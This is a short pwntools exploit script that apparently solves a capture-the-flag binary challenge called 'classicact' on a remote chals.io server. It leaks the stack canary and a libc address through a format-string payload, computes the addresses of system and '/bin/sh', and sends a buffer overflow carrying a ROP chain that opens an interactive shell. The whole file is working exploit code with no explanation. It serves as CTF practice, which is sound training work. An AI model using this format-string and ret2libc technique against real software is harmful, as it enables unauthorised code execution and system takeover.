from pwn import *

r = remote("0.cloud.chals.io", 10058)
#r = process("./classicact")

r.sendline(b"%p|%19$p|")
leak, cookie = r.recvuntil(b"?\n").split(b"Hello:\n")[1].split(b"|")[:2]
cookie = int(cookie, 16)
print(hex(cookie))
# _IO_2_1_stdout_+131
leak = int(leak, 16) - 131- 0x00000000001ed6a0
print(hex(leak))
binsh = leak + 0x1b45bd
system = leak + 0x522c0

pop_rdi = 0x00000000004013a3
putchar = 0x4010a0
puts = 0x4010c0

#r.sendline(b"aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr" + p64(cookie) + p64(putchar) + p64(putchar) + p64(pop_rdi) + p64(0x404028) + p64(0x4010c0))
r.sendline(b"aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr" + p64(cookie) + p64(putchar) + p64(putchar) + p64(pop_rdi) + p64(binsh) + p64(system))

r.interactive()
